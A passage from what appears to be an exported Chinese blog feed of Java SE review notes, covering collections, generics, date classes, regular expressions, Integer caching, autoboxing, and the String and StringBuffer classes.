它的底层是链表实现,并且是非线程安全的，也是Set集合中唯一 一个能保证怎么存就怎么取的集合对象，因为它的父类是HashSet，所以也是保证元素唯一的，它的原理与HashSet一样。]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>HashSet类</tag>
        <tag>LinkedHashSet类</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——增强for循环、JDK5新特性与可变参数]]></title>
    <url>%2F2019%2F04%2F10%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E5%A2%9E%E5%BC%BAfor%E5%BE%AA%E7%8E%AF%E3%80%81JDK5%E6%96%B0%E7%89%B9%E6%80%A7%E4%B8%8E%E5%8F%AF%E5%8F%98%E5%8F%82%E6%95%B0%2F</url>
    <content type="text"><![CDATA[增强for循环的概述 简化数值与集合的遍历，不需要那么麻烦了，它的底层依赖的是iterator迭代器。 使用方法：123for(创建一个临时变量储存数据：需要遍历的数组或者集合) &#123; 在这里使用那个临时变量就好了。&#125; eclipse可以直接输入fore然后按提示快捷键 ps：只要可以用迭代器迭代，那么就可以用增强for循环。 JDK5新特性 可以导入类里的静态方法，不过意义不大，开发不用，但是要看得懂。 使用方法1import static 包名.类名.方法名 可变参数的概述 定义方法的时候不知道该定义多少个参数,我们就可以用到可变参数 格式1public void a(数据类型 ... 变量名) 注意事项 1、这里的变量其实底层是一个数组 2、如果一个方法里有多个参数，那么可变参数一定要放在最后面]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>JDK5新特性</tag>
        <tag>增强for循环</tag>
        <tag>可变参数</tag>
        <tag>静态导入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——泛型]]></title>
    <url>%2F2019%2F04%2F10%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E6%B3%9B%E5%9E%8B%2F</url>
    <content type="text"><![CDATA[泛型的概述 可以把泛型理解成“参数化类型”，他可以在类、接口和方法中使用，分别被称为泛型类、泛型接口、泛型方法。 泛型类的使用1Collection&lt;泛型&gt; = new Collection&lt;&gt;(); 定义方法的作用 指定自己需要使用的数据类型。 泛型接口的定义：1interface Inter&lt;E&gt; &#123;&#125; 泛型类的定义与接口的实现12class press&lt;E&gt; implements Inter&lt;String&gt; &#123; &#125;//在这个类中用E代替传入的数据类型即可 定义类的作用： 在创建这个类的引用或者对象时，可以自己指定数据类型。ArrayList这个类就是这样定义的。 泛型类中方法使用定义好的泛型1public E aa() &#123;&#125; ps：在创建这个泛型类的时候就把这个E给赋值了，赋的值时自己定义的数据类型，可以在方法中直接使用E，当然这个E可以定义成其他的符号。 泛型方法的定义1public&lt;T&gt; aaa() &#123;&#125; 作用： 让类中的某个方法有自己的泛型。 注意事项： 1、在定义了泛型的类中最好不要定义某个方法特有的泛型2、静态方法因为在类的加载就加载了，所以不能使用类的泛型，只能声明自己的泛型。 ps：可以把泛型看作一个变量来理解。 泛型定义示例12345678910111213141516public static void main (String ages[]) &#123; person&lt;String&gt; p =new person&lt;String&gt;(); //创建完之后，E就等于String了 p.b(true); //调用后b这个方法中T的类型就等于Boolean了 &#125;class person&lt;E&gt; &#123;private E a;public&lt;T&gt; void b(T tt) &#123; E s; System.out.println(tt); &#125;&#125; 泛型作用 限制某个集合只能存什么类型的数据,防止出现数据的安全隐患。 泛型的好处： 1、提高了安全性（因为能限制只能存什么数据，所以把运行期的错误转移到了编译期） 2、省去了数据需要从Object强转的麻烦 泛型的注意事项 1、泛型的数据类型一定要时引用数据类型。 2、不要把泛型数据类型定义成Object，因为没有任何意义。 jdk1.7版本新特性：菱形泛型 解析：创建对象时，等号前面&lt;&gt;里写了泛型，那么后面&lt;&gt;里可以不写数据类型，因为两个尖括号放一起很想菱形，所以叫做菱形泛型。 泛型高级之——通配符？ &lt;?&gt; 1ArrayList&lt;?&gt; a = new ArrayList&lt;&gt;(); 当我们遇到右边返回对象时，这时我们不知道返回对象的泛型(类型)是什么，那么我们左边就可以用通配符”?”来替代。 &lt;？ extends E&gt; 向下限定，表示只能传入E或者它的子类。 泛型的边界定义 &lt;？ extends E&gt;： 泛型固定上边界，向下限定，表示只能传入E或者它的子类。 &lt;? super E&gt;: 泛型固定下边界，向上限定，表示只能传入E或者它的父类]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>泛型</tag>
        <tag>泛型边界定义</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——Collection集合框架]]></title>
    <url>%2F2019%2F04%2F09%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94Collection%E9%9B%86%E5%90%88%E6%A1%86%E6%9E%B6%2F</url>
    <content type="text"><![CDATA[集合与数值的区别 1、数组即可以存基本数据类型也可以存引用数据类型(对象) 2、集合只能存引用数据类型，如果存基本数据类型，那么系统会自动装箱成对象。 3、数组的长度是固定的，不能自动增长 4、集合的长度是可变的。 集合与数组的缺点 数组： 长度是固定的，不能自动增加 集合： 会浪费很多空间， 原因：它的部分底层是数组，它增加长度的方法是首先创建长度为10的数组，然后不够就1.5倍增加，直到够存下为止。 Collection集合的继承体系图:123456789101112131415 Collection 单列集合的根接口,它是抽象类，一般用来父类引用子类对象 / \ / \ / \ List Set 有序，有索引，可重复储存 无序，无索引，不可重复储存（我们只要学习如何保证元素不是重复的） / | \ / \ / | \ / \ / | \ / \ ArrayList LinkedList Vector HashSet TreeSet 查改快(直接索引查找) 查改慢(要遍历) 查改略慢 增删慢(考虑增容、拷贝) 增删快 增删慢 线程不安全 线程安全 线程安全 数组实现 链表实现 数组实现 Collection集合的方法 .add() 向集合中存入数据，list集合返回true，Set集合如果集合有相同的数据返回false，否则true。 .remove() 删除 .toArray() 把集合转换成数组输出，如果ArrayList对象加了泛型，那么可以传入某类型数组对象，然后用某类型数组直接引用。 .addAll() 把传入集合加入到调用的集合中 .removeAll() 删除调用集合中与传入集合交集的数据 .containsAll() 判断调用集合中是否有传入集合的数据 .retainAll() 取两个集合的交集，如果传入类有交集那么会把那两个值覆盖调用集合的值，调用的集合改变了就返回true，否则false List集合方法： .add(int index,) 在某个索引添加指定数据 .remove(int index,) 在某个索引删除指定数据，删除了什么就返回什么。一个小问题：remove不会自动装箱，可能会识别错误导致程序出错 .get(int index,) 输出索引对应的数据，所以list可以直接用这个方法遍历数组，不用迭代了。 .set(int index,) 设置指定索引的数据 ps：集合containsAll、removeAll等方法底层都是基于equals方法的，所以在集合中处理对象时，传入对象需要重写object父类的equals方法才能实现效果。 集合迭代的概述： 集合是存储元素，而这些元素需要查看，那么就需要用到迭代，迭代也就是遍历。 迭代使用示例：123456789Collection c = new ArrayList();Iterator it = c.iterator();//.hasNext()判断是否还有数据While(it.hasNext())&#123; System.out.println(it.next()); //.next()获取下一个数据&#125; 迭代器修改数据产生的异常与解决方案： 异常： 在利用迭代器遍历数据时，如果我们在遍历的中途给集合添加数据，那么会出现异常 异常原因： 在创建iterator迭代器时已经把集合的数量给了迭代器，如果中途给集合添加数据就是并发修改了。 解决方法： 使用iterator这个list独有的迭代器，然后调用Itterator自己的add添加数据。 Vector的概述 jdk刚出来他就有了，在jdk1.2版本加入了collection体系，后来因为vector有的功能ArrayList都有，而且还比他强大，所以不用vector了。 Vector与ArrayList的区别 Vector是线程安全的，它的效率相对低也就是查询相对慢； 反之ArrayList它是线程不安全的，但是效率高。 LinkedList集合的概述 使用链表实现的list集合。 数组实现集合与链表实现集合的优缺点： 数组： 查询修改快，但是增删慢 链表： 查询修改慢，但是增删快 集合的面试题——之ArrayList、Vector、linkedList区别： ArrayList： 数组实现，查询修改快，但是增删慢，它是线程不安全的。 LinkedList： 链表实现，查询修改慢，但是增删快，它是线程不安全的。 Vector： 数组实现，相对ArrayList查询慢效率低，因为它是线程安全的。 他们三个的用法： 1、查询多用ArrayList2、增删多用LinkedList3、增删查询都多用ArrayList4、Vector面试的时候用，虽然它是线程安全的，但是在需要线程安全的时候也不用它。 LinkedList的特殊方法 .addFirst() 与 .addLast() 在链表头部与尾部添加数据 .getFirst 与 .getLast() 获取链表头部或者尾部数据 .removeFirst 与 .removeLast() 删除链表头部或者尾部数据 .get() 获取链表指定位置的数据]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>Collection集合</tag>
        <tag>集合</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——Date、SimpDateFormat、Calendar类]]></title>
    <url>%2F2019%2F04%2F09%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94Date%E3%80%81SimpDateFormat%E3%80%81Calendar%E7%B1%BB%2F</url>
    <content type="text"><![CDATA[Date的概述 获取瞬间时间，精确到毫秒。 例子： 12345Date d = new Date();//打印d会显示打印时瞬间的电脑系统时间Date d = new Date(0)//这样会打印1970年1月1日的8点 解析： 1、为什么是1970年1月1日：首先1970年1月1日是c语言和UNLX的生日，然后因为最早的计算机是32位的，32位最多表示的时间是68年，而最早出现的UNLX系统考虑到计算机产生的年代和应用的时限，所以综合取了1970年1月1日为UNLX 的纪元时间开始。 2、为什么是8点：因为我们电脑的时区是东8区，所以显示的是8点。 Date的方法 .getTime() 通过时间对象获取毫秒值 .setTime() 设置毫秒值，设置1000那么输出时间对象的时间为：1970年1月1日8点钟多一秒。 SimpDateFormat的概述 1、它是DateFormat的子类，拥有DateFormat的所有功能。 2、DateFormat 是日期/时间格式化子类的抽象类 3、SimpleDateFormat 是一个以与语言环境有关的方式来格式化和解析日期的具体类。它允许进行格式化（日期 -&gt; 文本）、解析（文本 -&gt; 日期）和规范化。总的来说，它们就是一个日期格式化类，构造方法传入格式规则可以按照相应的规则格式化日期。 方法 .format(Date d) 把日期类转换为String类 .parse(String str) 把时间字符串转换成日期对象，需要配合异常使用。 SimpleDateFormat类的实例12345678Date d = new Date(0);//获取当前瞬间时间SimpleDateFormat sdf = new SimpleDateFormat("yyyy年MM月dd日 HH:mm:ss");//创建日期格式化类并且进行格式化System.out.println(sdf.format(d));//格式化并且输出时间，结果为：1970年 Calendar类的概述 它把K的很多方法都替代掉了，Calendar 类是一个抽象类，它为特定瞬间与一组诸如 YEAR、MONTH、DAY_OF_MONTH、HOUR 等 日历字段之间的转换提供了一些方法，并为操作日历字段（例如获得下星期的日期）提供了一些方法。 方法： .getInstance() 获得一个日历，并且是基于当前时间的，返回一个Calendar的子类，可以父类引用子类对象 .get(int field) 返回指定日历字段的值，日历字段代表年月日那些，比如1那么就表示年，不过为了方便，Calendar给出了字段常量，比如Calendar.YEAR常量它的值是1，代表了年。 .add(int field,int i1) 指定字段的值加减，当前年为2018 例当前年为2018：add(Calendar.YEAR，-1)那么返回2017 .set(int year,int month,int day) 修改指定字段,可以直接修改年月日，也可以像add那样修改年等。 代码示例：123456//获取今天年月日和星期Calendar c = Calendar.getInstance();//获取一个日历System.out.println(c.get(Calendar.YEAR) + "年" + c.get(Calendar.MONTH) + 1 + "月" + c.get(Calendar.DAY_OF_MONTH) + "日\n星期" + (c.get(Calendar.DAY_OF_WEEK) - 1));]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>Date类</tag>
        <tag>SimpDateFormat类</tag>
        <tag>Calendar类</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——BigInteger与BigDecimal类]]></title>
    <url>%2F2019%2F04%2F09%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94BigInteger%E4%B8%8EBigDecimal%E7%B1%BB%2F</url>
    <content type="text"><![CDATA[BigInteger的概述 不可变的任意精度的整数。所有操作中，都以二进制补码形式表示 BigInteger（如 Java 的基本整数类型）。 BigInteger 提供所有 Java 的基本整数操作符的对应物，并提供 java.lang.Math 的所有相关方法。 另外，BigInteger 还提供以下运算：模算术、GCD 计算、质数测试、素数生成、位操作以及一些其他操作。 ps：了解一下BigInteger类可以存下任意长度的数值就行了。 与BigInteger不同的是，BigDecimal是小数####注意事项： 开发中创建BigDecimal对象进行运算时，给它有参构造传入的值要以字符串形式传入，如果以数值形式传入的话会损失精度。]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>BigInteger类</tag>
        <tag>BigDecimal类</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——System类]]></title>
    <url>%2F2019%2F04%2F09%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94System%E7%B1%BB%2F</url>
    <content type="text"><![CDATA[System类的概述 System类有标准输入、标准输出和错误输出流； 对外部定义的属性和环境变量的访问；加载文件和库的方法； 还有快速复制数组的一部分的实用方法。 字段： err标准错误流 in标准输入流 out标准输出流 System类的方法 .gc() 运行垃圾收集器，虽然objcket类中有一个filalize的方法会自动清理垃圾，但是垃圾没有超过一个量是不会自动收集的。 .exit() 退出java虚拟机jvm，传入值为0是正常终止，非0为异常终止。 .currentTimeMillis() 返回当前时间与协调世界时 1970 年 1 月 1 日午夜之间的时间差（以毫秒为单位测量）。 ps：经常应用在计算程序运行时间，从程序开始记录一次，结束记录一次，然后减去即可。 .arraycopy(Object src, int srcPos, Object dest, int destPos, int length) 从指定源数组中复制一个数组，复制从指定的位置开始，到目标数组的指定位置结束。 参数：src - 源数组。srcPos - 源数组中的起始位置。dest - 目标数组。destPos - 目标数据中的起始位置。length - 要复制的数组元素的数量。]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>System类</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——Random类]]></title>
    <url>%2F2019%2F04%2F09%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94Random%E7%B1%BB%2F</url>
    <content type="text"><![CDATA[Random概述 利用传入的随机数种子，生成一个伪随机数 Random类的方法 .nextInt(Int i); 生成一个从0到i的随机数，包括0不包括i 例子1234567Random r = new Random();//不输入种子的话系统自动使用纳秒来当作种子r.nextInt(100);//生成了0到100的随机数，不包括100//ps：如果要生成1-100的随机数，直接+1]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>Random类</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——Math数学类的使用]]></title>
    <url>%2F2019%2F04%2F09%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94Math%E6%95%B0%E5%AD%A6%E7%B1%BB%E7%9A%84%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[Math类的方法 int abs(int a) 取绝对值 double ceil(double a) 向上取整数返回double，例子：输入12.56输出一个13.0 double floor(double a) 与上同理，但是向下取整数 int max(int a,int b) min自学 取大的值 double pow(double a,double b) a是底数，b是指数 double random() 生成0.0到1.0之间的随机小数，包括0.0不包括1.0 int round(float a) 参数为double的自学 四舍五入 double sqrt(double a) 开平方 输入4返回2.0 输入9返回3]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>Math类</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——正则表达式]]></title>
    <url>%2F2019%2F04%2F09%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[正则表达式概念 就是一种规则，可以在某一段字符串中以某一个特殊的规则，取到自己想要的那段字符串。 String中的正则表达式方法： .matches() 是否匹配这个正则表达式，返回true或者false .replaceAll(String regex,String xxx) 替换所有匹配到的字符串 ps：使用正则非常好用，例：regex的内容为\d 那么那个字符串的所有数字都会被替换 .replaceFirst(String regex,String xxx) 替换找到的第一个字符串 .split() 以某一个字符串切割字符串 正则表达式专属类与方法实现方法：12345678Pattern p = Pattern.compile("a*b");//把正则表达式编译到模式中Matcher m = p.matcher("aaaaab");//使用上面创建的对象来匹配一个字符串boolean b = m.matches();//全部匹配到了则返回true 实战例子：12345678910111213String str1 = "我手机号码是18734126341，曾经用过17707053381，曾经还用过13228865165";Pattern p = Pattern.compile("1[356789]\\d&#123;9&#125;");//把正则表达式编译到模式中Matcher m = p.matcher(str1);//创建一个匹配器while(m.find())//匹配下一个能成功匹配的字符串，成功返回trueSystem.out.println(m.group());//返回上一个匹配到的字符串 正则表达式字符类 表达式 获取结果 [abc] a、b 或 c（简单类） [^abc] 任何字符，除了 a、b 或 c（否定） [a-zA-Z] a 到 z 或 A 到 Z，两头的字母包括在内（范围） [a-d[m-p]] a 到 d 或 m 到 p：[a-dm-p]（并集） [a-z&amp;&amp;[def]] d、e 或 f（交集） [a-z&amp;&amp;[^bc]] a 到 z，除了 b 和 c：[ad-z]（减去） [a-z&amp;&amp;[^m-p]] a 到 z，而非 m 到 p：[a-lq-z]（减去） 正则表达式预定义字符类 表达式 获取结果 . 任何字符（与行结束符可能匹配也可能不匹配） \d 数字：[0-9] \D 非数字： [^0-9] \s 空白字符：[ \t\n\x0B\f\r] \S 非空白字符：[^\s] \w 单词字符：[a-zA-Z_0-9] \W 非单词字符：[^\w] 正则表达式Greedy 数量词 表达式 获取结果 X? X，一次或一次也没有 X* X，零次或多次 X+ X，一次或多次 X{n} X，恰好 n 次 X{n,} X，至少 n 次 X{n,m} X，至少 n 次，但是不超过 m 次 正则表达式的分组功能 1、使用（）进行分组 例子：(.)\1(.)\2 代表：第一组再出现一次，第二组也再出现一次，也就是\1同等与上一组出现的数据 例子：123str1 = “高高兴兴”str1.matches("(.)\\1(.)\\2")//返回true 2、$符号，在替换时可以获取到正则表达式中某组获取到的字符，$1代表获取到第一组中的字符串 例子：12"问问啊啊".replaceAll("(.)\\1","$1");//替换后的结果为：问啊 $1 获取到了(.)的值]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——Integer中的常见面试题]]></title>
    <url>%2F2019%2F04%2F09%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94Integer%E4%B8%AD%E7%9A%84%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98%2F</url>
    <content type="text"><![CDATA[代码示例 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859package com.heima.wrapclass;public class Demo5_Integer &#123; /** * @param args */ public static void main(String[] args) &#123; Integer i1 = new Integer(97); Integer i2 = new Integer(97); System.out.println(i1 == i2); //false System.out.println(i1.equals(i2)); //true System.out.println("-----------"); Integer i3 = new Integer(197); Integer i4 = new Integer(197); System.out.println(i3 == i4); //false System.out.println(i3.equals(i4)); //true System.out.println("-----------"); Integer i5 = 127; Integer i6 = 127; System.out.println(i5 == i6); //true System.out.println(i5.equals(i6)); //true System.out.println("-----------"); Integer i7 = 128; Integer i8 = 128; System.out.println(i7 == i8); System.out.println(i7.equals(i8)); //true /* * -128到127是byte的取值范围,如果在这个取值范围内,自动装箱就不会新创建对象,而是从常量池中获取 * 如果超过了byte取值范围就会再新创建对象 * * public static Integer valueOf(int i) &#123; assert IntegerCache.high &gt;= 127; //i&gt;= -128 &amp;&amp; i &lt;= 127 if (i &gt;= IntegerCache.low &amp;&amp; i &lt;= IntegerCache.high) return IntegerCache.cache[i + (-IntegerCache.low)]; return new Integer(i); &#125; */ &#125;&#125; 总结 底层代码可以理解成一个数组，这个数组索引0对应着-128、255对应着127，当传入的值在-128 - 127之间时自动装箱时会直接在这个数组中取值，进而引用地址是一样的，所以上面返回了true]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>Integer</tag>
        <tag>Integer面试题</tag>
        <tag>面试题</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——JDK5新特性之_自动拆箱与装箱]]></title>
    <url>%2F2019%2F04%2F09%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94JDK5%E6%96%B0%E7%89%B9%E6%80%A7%E4%B9%8B-%E8%87%AA%E5%8A%A8%E6%8B%86%E7%AE%B1%E4%B8%8E%E8%A3%85%E7%AE%B1%2F</url>
    <content type="text"><![CDATA[代码详解123456789101112int x = 123;Integer i1 = new Integer(x);//手动装箱int y = i1.intValue();//手动拆箱Ineger x = 123;//自动装箱，他的底层是手动装箱int a = x + 100;//自动拆箱，他的底层是自动拆箱]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>新特性</tag>
        <tag>JDK5</tag>
        <tag>自动拆箱</tag>
        <tag>自动装箱</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——String转换为其他数据类型]]></title>
    <url>%2F2019%2F04%2F09%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94String%E8%BD%AC%E6%8D%A2%E4%B8%BA%E5%85%B6%E4%BB%96%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%2F</url>
    <content type="text"><![CDATA[代码： .parseXXX(“”); 特点： 基本数据类型包装类有八种，其中除了char其他都有.parseXXX()方法，因为char只能存入一个字符。 代码示例： 12String s1 = "123";int i = Integer.parseInt(s1);]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>String</tag>
        <tag>String转换为其他数据类型</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——String与int的相互转换]]></title>
    <url>%2F2019%2F04%2F09%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94String%E4%B8%8Eint%E7%9A%84%E7%9B%B8%E4%BA%92%E8%BD%AC%E6%8D%A2%2F</url>
    <content type="text"><![CDATA[String转int 1、String s1 = 1 + “”； 2、String s2 = string.toString(1); 3、Integer i = new Integer(1); String s1 = i.toString(); 4、String s1 = Integer.toString(1); ps:推荐用第一第二种方式，代码更简洁。 int转String 1、123String s1 = "123";Integer i = new Integer(s1);int a = i.intValue(); 2、1String s1 = Integer.parseInt(123); ps:推荐用第二种]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>String与int的相互转换</tag>
        <tag>String转int</tag>
        <tag>int转String</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——基本数据类型包装类]]></title>
    <url>%2F2019%2F04%2F09%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%8C%85%E8%A3%85%E7%B1%BB%2F</url>
    <content type="text"><![CDATA[基本数据类型和包装类的对应表 基本数据类型 包装类 byte Byte short Short long Long float Float double Double boolean Boolean —————–上面的只是改大写，下面的改的更多 基本数据类型 包装类 int Integer char Character Integer的特点： 1、能在int和String类型之间相互转换 2、提供了处理int类型时，非常有用的其他一些常量和方法。 3、能在创建对象时传入String类型的数据，但只限于int值。]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>基本数据类型包装类</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——Arrays类]]></title>
    <url>%2F2019%2F04%2F09%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94Arrays%E7%B1%BB%2F</url>
    <content type="text"><![CDATA[Arrays类的概述 它其实就是一个数组的工具类，提供各种关于数组的操作 Arrats的方法： .toString() 数组转换为字符串 .sort() 数组排序 .binarySearch() 二分查找，返回索引值，如果没找到就返回，被查找数据在数组中应该出现的插入点的负数 减去1 前提：这个数组是一个序列数组 .asList() 把数组转换成集合，用List引用。例子： 1List&lt;String&gt; l = Arrays.asList(数组); 数组转集合的意义： 虽然从数组转换成的集合不能增加和减少，但是我们可以用集合的思想来操作数组，也就是用集合除add、remove以外的方法。]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>Arrays类</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——StringBuffer类]]></title>
    <url>%2F2019%2F04%2F09%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94StringBuffer%E7%B1%BB%2F</url>
    <content type="text"><![CDATA[StringBuffer的概述 1、它是字符串缓冲区（容器），底层默认是长度为16的字符数组。 2、StringBuffer是线程安全的，StringBuilder是线程不安全的 3、线程安全速度更慢，线程不安全速度更快。 StringBuffer与String的区别 1、String赋的值它是不能被改变的，只能丢弃重新创建，如果字符拼接过多会产生过多的垃圾。 2、StringBuffer赋的值是可以被改变的，类似字符拼接建议用这个类，因为不会产生过多的垃圾。 2、虽然它们都是引用数据类型，但是String做参数传递时是和基本数据类型一样的，而StringBuffer传递的只是对创建对象的引用，也就是地址值。 StringBuffer的方法 属性获取： .capacity()返回当前容量 .length()返回实际长度 数据添加： .append()把任何数据传入字符串缓冲区，然后返回缓冲区对象本身。 .insert(索引,字符串)在任意位置之后将任意类型数据插入字符串缓冲取内，返回本身。 数据删除： .deleteCharAt()删除任意索引的数据，返回本身。 .delete(索引1,索引2)删除从索引1开始到索引2位置的数据，返回本身。（包含头不包含尾） 数据替换反转： .reverse()字符反转 .replace(开始索引，结束索引，要替换的数据)&gt;字符替换 数据截取：（截取后返回的数据不是表示容器本身，而是返回一个String） .subString(索引)从索引开始，截取到字符串末尾。 .subString(开始,结尾)从开始位置截取字符串到结尾位置，不包括结尾索引。 StringBuffer的构造方法特点 1、无参构造默认容量为 16个字符 2、传入整数，比如传入10，那么这个容器的容量就为10个字符 3、传入一个字符串，比如传入：啊啊，那么实际长度为4，字符串缓冲区容量为20 4、如果内部缓冲区溢出，那么容量自动增大。 5、StringBuffer重写了toString()方法，显示的是它的属性值，也就是它的元素。 StringBuffer注意事项 1、不要利用重新创建另一个对象来试图清空容器，这只是引用了另一个容器对象而已，之前的那个容器并没有被清空，可以利用delete方法清空容器。 2、因为String与任意字符串相加的底层实现就是使用容器，并且String的值是不能修改的，它只能把之前的数据做垃圾处理重新创建一个数据，这样会不断的产生垃圾，所以在类似 字符串数组 转换成 字符串 或者 字符串拼接（String s = s1 + s2；） 的例程中使用容器最好。 StringBuffer与String的互转： StringBuffer转String 1、创建一个String对象，把容器传进去。 2、使用toString()方法。 3、使用subString()方法。 String转StringBuffer 1、创建一个StringBuffer对象，传入字符串即可。 2、通过append()方法把字符串加入到容器内。]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>StringBuffer类</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——String类]]></title>
    <url>%2F2019%2F04%2F09%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94String%E7%B1%BB%2F</url>
    <content type="text"><![CDATA[String类的概述 它的实例用来存储字符串，在平时的使用中我们会经常用到，通常初学者会以为它是一个基本数据类型，但其实它是一个引用数据类型. String类特点： 1、String实际上是一个类，它重写了toString方法，所以创建String引用后直接输出调用该引用的名称就可以输出字符串数据。 2、String属于引用数据类型，而不是基本数据类型，基本数据类型为：int、char。。。，所以String数据对比需要用到equals方法，否则会出现判断不准确的问题 3、String没有set和get方法，所以它不存在修改数据，只能是替换数据，把之前的数据当作垃圾。 4、String s = “abc” 与 String a = “abc” 它们两个变量其实是记录了常量池中的地址值，而常量池有个特性，就是已有的数据它不会再去创建，所以 s==a为ture 5、String s = &quot;a&quot; + &quot;b&quot; + &quot;c&quot; 同等于String a = &quot;abc&quot; 因为java有常量优化机制，java编译时已经确定s = abc，所以s拿到的是常量abc的地址。 6、 1234String b = "ab"String c = "abc"c == a + "c"//结果为false 解析：因为任何数据与字符串用 + 连接，会在堆内存中创建StringBuider 或 StringBuffer缓冲区对象并使用append方法把数据相连，这里会得出：&quot;abc&quot;然后再使用toString方法创建一个“abc”的String对象返回这个”abc”被保存在堆内存中，而不是保存在常量池，所以变量c的值是常量池中的地址，而a + “c”是堆内存中的地址，所以用“==”号做比较返回false 7、String赋的值是不可以被改变的，只有把之前的值丢弃变成垃圾后，再赋新的值。 8、String虽然是引用数据类型，但是它当作参数传递的时候，它是和基本数据类型一样的。 获取键盘输入String需要注意的 System.in 它是标准的输入流，对应着键盘录入 sc.hasNextxxx（） 它判断输入的数是不是xxx数据类型，xxx可以是int、double等 sc.nextxxx（） 它获取已经输入的项，xxx和上面的xxx相同 sc.nextLine() 它获取字符串，遇到/r/n就结束，也是因为这个机制，所以和其他获取输入命令混用会出现获取不到的问题，举个例子。 例：nextInt() 之后又用 nexiLine() 获取的是整数，而实际是全部内容为 数值/r/n 此命令只获取数值部分，所以留下了/r/n，然后nextLine见到上面这个/r/n就直接结束了。 解决方法：录入所有数据都用nextLine，然后通过数据转换来实现。 String的构造方法12String str = new String(Byte[] b);//有参构造 可以按照平台的默认字符集（也就是码表，GBK等等）解码byte数组，而gbk等码表都涵盖了ascii码表，而码表中98、99等代码都代表着ab等，所以解码后看到的和解码前的数据不一样。 12String str = new String(Byte[] b,2,4);//表示从b数组中的第二个索引开始解码，总共解码4个数据 String类的判断功能 .equals() 比较字符串内容序列是否相同，区分大小写 .equalsIgnoreCase() 与上面不同的是：不区分大小写 .contains() 判断字符串中是否包含传入的字符串 .startsWith() 判断字符串是否以传入字符串开头 .endswith() 判断字符串是否以传入字符串结尾 .isEmpty() 判断字符串是否为空 Null与””的区别 “”是字符串常量，也是String类的对象，所以可以调用String类的方法 